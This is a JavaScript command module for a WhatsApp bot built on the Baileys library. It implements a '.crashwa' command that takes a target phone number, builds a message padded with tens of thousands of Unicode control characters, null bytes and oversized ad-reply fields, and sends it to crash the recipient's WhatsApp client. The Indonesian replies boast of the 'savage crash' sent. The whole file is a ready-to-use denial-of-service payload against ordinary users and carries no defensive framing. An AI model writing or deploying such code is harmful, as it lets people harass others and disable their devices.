const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");

module.exports = async (vanz, m, args) => {
    if (!args[0]) {
        return vanz.sendMessage(
            m.chat,
            { text: "Masukkan nomor target!\n\nContoh: .crashwa 628xxxxx" },
            { quoted: m }
        );
    }

    let target = args[0].replace(/[^0-9]/g, "");
    if (!target.endsWith("@s.whatsapp.net")) {
        target = target + "@s.whatsapp.net";
    }

    // Payload CRASH ganas
    const payload =
        "\u202E\u067E".repeat(40000) +
        "\u035F\u0361".repeat(20000) +
        "\u0000\u0000\u0000".repeat(50000) +
        "\uFEFF".repeat(20000);

    const baseMessage = {
        conversation: payload,
        contextInfo: {
            forwardingScore: 999999,
            isForwarded: true,
            mentionedJid: []
        },
        externalAdReply: {
            title: payload.substring(0, 5000),
            body: payload.substring(0, 5000),
            mediaType: 1,
            thumbnail: Buffer.from([]),
            sourceUrl: "https://0.0.0.0/",
            mediaUrl: "",
            renderLargerThumbnail: true
        }
    };

    try {
        const msg = generateWAMessageFromContent(
            target,
            proto.Message.fromObject(baseMessage),
            {}
        );

        await vanz.relayMessage(target, msg.message, { messageId: msg.key.id });

        await vanz.sendMessage(
            m.chat,
            { text: `Crash ganas dikirim ke nomor: *${args[0]}* 😈🔥` },
            { quoted: m }
        );

    } catch (e) {
        await vanz.sendMessage(
            m.chat,
            { text: "Gagal mengirim crash!" },
            { quoted: m }
        );

        console.log("Crash error:", e);
    }
};